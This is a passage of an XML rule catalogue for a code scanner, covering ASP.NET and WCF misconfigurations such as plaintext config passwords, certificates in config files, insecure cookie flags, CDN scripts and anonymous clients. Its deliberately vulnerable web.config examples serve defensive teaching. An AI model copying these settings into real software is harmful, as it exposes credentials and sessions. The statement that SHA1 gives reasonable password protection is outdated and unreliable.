    <name>ASP.NET Misconfiguration: Weak Password Protection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing a password in plaintext or using weak encryption could result in a system compromise.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  ASP.NET applications can store user name and password pairs in <code>&lt;credentials&gt;</code> elements in the <code>web.config</code> file for an ASP.NET application, which supports plaintext, MD5 and SHA1 password formats.<br><br>Passwords stored in plaintext or using a weak encryption algorithm are accessible to anyone with the access to the application's configuration files. This may include the machine where the application is hosted or the source code repository where the application lives.<br><br><b>Example 1:</b> The following <code>web.config</code>  entry incorrectly stores its passwords in plaintext.<br><br><pre><br>&lt;configuration&gt;<br>  &lt;system.web&gt;<br>    &lt;authentication&gt;<br>      &lt;forms protection="All"&gt;<br>	   &lt;credentials passwordFormat="Clear"&gt;<br>   		&lt;user name="user1" password="my_password"/&gt;<br>		&lt;user name="user2" password="my_password1"/&gt;<br>        &lt;/credentials&gt;<br>    	 &lt;/forms&gt;<br>    &lt;/authentication&gt;<br>  &lt;/system.web&gt;<br>&lt;/configuration&gt;<br></pre><br><br>ASP.NET supports credential passwords stored in three formats, specified by the <code>passwordFormat</code> attribute of the <code>configuration/system.web/authentication/forms/credentials</code> element. The possible values for this attribute are:<br><br><code>Clear</code> - indicates that the password is stored in plaintext (least secure)<br><code>MD5</code> - indicates that the password's MD5 hash is stored<br><code>SHA1</code> - indicates that the password's SHA1 hash is stored (most secure)<br><br>While an MD5 hash is more secure than plaintext, researchers have found brute-force attacks against the MD5 hashing algorithm. At this time, a SHA1 hash still provides reasonable protection against such attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>.NET Framework General Reference: credentials Element</em> Microsoft Corporation<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 261</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_certificate_management_certificate_in_configuration_file</key>
    <internalKey>Environment/Certificate Management/Certificate in Configuration File</internalKey>
    <name>Certificate Management: Certificate in Configuration File</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing a plaintext certificate in a configuration or manifest file could result in a compromise of that certificate.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Storing a plaintext certificate in a configuration or manifest file allows anyone who can read the file access to the certificate-protected resource. Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this attitude makes an attacker's job easier. Good certificate management guidelines require that a certificate never be stored in plaintext.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 13, CWE ID 260, CWE ID 555</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13]  <em>Package manifest schema reference: Certificate</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>
																									   <p>[19]  <em>Side-by-side Assemblies Reference: Manifest File Reference: Application Manifests</em> <br></p>
																									   <p>[20]  <em>Side-by-side Assemblies Reference: Manifest File Reference: Manifest file schema</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_cookie_security_httponly_not_set_on_application_cookie</key>
    <internalKey>Environment/Cookie Security/HTTPOnly not Set on Application Cookie</internalKey>
    <name>Cookie Security: HTTPOnly not Set on Application Cookie</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program does not set the <code>HttpCookie.HttpOnly</code> property to <code>true</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The default value for the <code>httpOnlyCookies</code> attribute is false, meaning that the cookie is accessible through a client-side script. This is an unnecessary cross-site scripting threat, resulting in stolen cookies. Stolen cookies can contain sensitive information identifying the user to the site, such as the ASP.NET session ID or forms authentication ticket, and can be replayed by the attacker in order to masquerade as the user or obtain sensitive information.<br>  <br><br><b>Example 1:</b> Vulnerable configuration:<br><pre><br>&lt;configuration&gt;<br>  &lt;system.web&gt;<br>    &lt;httpCookies httpOnlyCookies="false"&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[5]  <em>httpCookies Element</em> MSDN<br></p>
																									   <p>[6] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[10]  <em>Top 10 Application Security Vulnerabilities in Web.config Files</em> Developer Fusion<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_cookie_security_session_cookie_not_sent_over_ssl</key>
    <internalKey>Environment/Cookie Security/Session Cookie not Sent Over SSL</internalKey>
    <name>Cookie Security: Session Cookie not Sent Over SSL</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application session cookie is created without the <code>secure</code> flag set to <code>true</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Modern web browsers support a <code>secure</code> flag for each cookie.  If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.<br><br><br><b>Example:</b> In the example below, the session cookie will be added to the response without setting the <code>Secure</code> flag.<br><pre><br>...<br>&lt;configuration&gt;<br>   &lt;system.web&gt;<br>   &lt;authentication mode="Forms"&gt;<br>      &lt;forms requireSSL="false" loginUrl="login.aspx"&gt;<br>      &lt;/forms&gt;<br>   &lt;/authentication&gt;<br>   &lt;/system.web&gt;<br>&lt;/configuration&gt;<br>...<br></pre><br><br>If your application uses both HTTPS and HTTP but does not set the <code>secure</code> flag, cookies set during an HTTPS request will also be sent during subsequent HTTP requests. Sniffing network traffic over unencrypted wireless connections is a trivial task for attackers, so sending cookies (especially those with session IDs) over HTTP can result in application compromise.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Mike Perry <em>Automated HTTPS Cookie Hijacking</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 614</em> <br></p>
																									   <p>[13]  <em>HttpCookie Class</em> Microsoft<br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication, Insufficient Session Expiration</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_external_content_content_delivery_network</key>
    <internalKey>Environment/External Content/Content Delivery Network</internalKey>
    <name>External Content: Content Delivery Network</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Relying on a CDN to provide essential code directly to users can lead to malicious code execution.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Using a CDN to serve an application's dependent JavaScript offers many advantages over serving JavaScript from the application's own server.  These benefits include increased performance and less code maintenance for the application owner.  However, the application assumes that the CDN will deliver safe content to the browser.  If an attacker compromises a CDN, the CDN will deliver malicious code to the user's browser.  The user's browser is now executing code that the application cannot control or detect as malicious.<br><br><b>Example 1:</b> The following ASPX code includes Microsoft's jQuery code by referencing the Microsoft CDN:<br><br><pre><br>...<br>&lt;script src="http://ajax.microsoft.com/ajax/jquery/jquery-1.4.2.min.js" type="text/javascript"&gt;&lt;/script&gt;<br>...<br></pre><br><br><b>Example 2:</b> The following ASPX code enables the automatic redirect of all ASP.NET framework script requests to the Microsoft Ajax CDN:<br><br><pre><br>...<br>&lt;asp:ScriptManager<br>   ID="ScriptManager1"<br>   EnableCdn="true"<br>   Runat="Server" /&gt;<br>...<br></pre><br><br>In the above example, the ScriptManager control configures its ASPX page to automatically redirect any script requests to the appropriate CDN.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A3 Malicious File Execution</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10]  <em>Content Deliver Network and its Regulation</em> The Journal of China Universities of Posts and Telecommunications<br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 94, CWE ID 98</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[13]  <em>Managed Content Security Delivery</em> radware<br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.3</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 094</em> <br></p>
																									   <p>[19] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 098</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>
																									   <p>[21] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_password_management_empty_password_in_configuration_file</key>
    <internalKey>Environment/Password Management/Empty Password in Configuration File</internalKey>
    <name>Password Management: Empty Password in Configuration File</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using an empty string as a password is insecure.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is never appropriate to use an empty string as a password. It is too easy to guess.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 258</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[14]  <em>Password Guidelines</em> Microsoft<br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>
																									   <p>[20] J. Yan, A. Blackwell, R. Anderson, and A. Grant <em>The memorability and security of passwords -- some empirical results</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_password_management_password_in_configuration_file</key>
    <internalKey>Environment/Password Management/Password in Configuration File</internalKey>
    <name>Password Management: Password in Configuration File</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing a plaintext password in a configuration file could result in a system compromise.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource. Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this attitude makes an attacker's job easier. Good password management guidelines require that a password never be stored in plaintext.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 13, CWE ID 260, CWE ID 555</em> <br></p>
																									   <p>[11]  <em>How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI</em> Microsoft<br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_anonymous_message_client</key>
    <internalKey>Environment/WCF Misconfiguration/Anonymous Message Client</internalKey>
    <name>WCF Misconfiguration: Anonymous Message Client</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The absence of authentication means everyone is able to access this service.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A service that does not authenticate its clients allows access to all comers.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11]  <em>Common Security Scenarios</em> Microsoft<br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 285</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[16]  <em>Message Security with an Anonymous Client</em> Microsoft<br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3, Requirement 7.2</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7, Requirement 7.2</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_anonymous_transport_client</key>
    <internalKey>Environment/WCF Misconfiguration/Anonymous Transport Client</internalKey>
    <name>WCF Misconfiguration: Anonymous Transport Client</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The absence of authentication means everyone is able to access this service.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A service that does not authenticate its clients allows all comers to access its functionality.<br>
							</p>
